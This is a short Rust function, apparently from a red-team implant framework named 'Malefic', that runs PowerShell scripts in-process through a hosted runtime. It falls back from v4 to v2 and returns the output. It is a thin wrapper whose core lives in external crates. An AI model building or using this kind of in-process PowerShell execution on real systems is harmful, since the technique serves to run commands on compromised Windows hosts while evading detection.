pub unsafe fn pwsh_exec_command(script: &String) -> String {
    #[cfg(feature = "prebuild")]
    {
        use std::ffi::CString;
        CString::from_raw(
            crate::win::kit::MaleficPwshExecCommand(
                script.as_ptr(),
                script.len(),
            ) as _
        ).to_str().unwrap_or_default().to_string()
    }
    #[cfg(feature = "source")]
    {
        use malefic_win_kit::pwsh::PowershellUtils::PsUtils;
            let ps_env = unsafe {
                match PsUtils::create_v4() {
                    Ok(ps) => ps,
                    Err(_) => match PsUtils::create_v2() {
                        Ok(v2) => v2,
                        Err(e) => {
                            return e;
                        }
                    }
                }
            };

        match ps_env.run_ps_command(script) {
            Ok(ret) => {
                ret
            },
            Err(e) => {
                e
            }
        }
    }
}